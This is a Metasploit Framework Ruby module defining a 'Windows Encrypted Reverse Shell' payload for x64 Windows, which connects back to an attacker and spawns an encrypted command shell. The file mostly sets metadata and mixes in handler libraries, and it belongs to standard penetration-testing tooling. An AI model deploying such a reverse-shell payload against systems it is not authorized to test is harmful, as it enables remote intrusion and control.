##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/encrypted_shell'
require 'msf/base/sessions/command_shell_options'
require 'msf/core/payload/windows/encrypted_reverse_tcp'

module MetasploitModule

  CachedSize = 4064

  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions
  include Msf::Payload::Windows::EncryptedReverseTcp
  include Msf::Payload::Windows::EncryptedPayloadOpts

  def initialize(info = {})
    super(merge_info(info,
      'Name'            => 'Windows Encrypted Reverse Shell',
      'Description'     => 'Connect back to attacker and spawn an encrypted command shell',
      'Author'          =>
      [
        'Matt Graeber',
        'Shelby Pace'
      ],
      'License'         => MSF_LICENSE,
      'Platform'        => 'win',
      'Arch'            => ARCH_X64,
      'Handler'         => Msf::Handler::ReverseTcp,
      'Session'         => Msf::Sessions::EncryptedShell,
      'DefaultOptions'  => { 'LinkerScript' => "#{LINK_SCRIPT_PATH}/func_order64.ld" },
      'Dependencies'    => [ Metasploit::Framework::Compiler::Mingw::X64 ]
      ))
  end
end
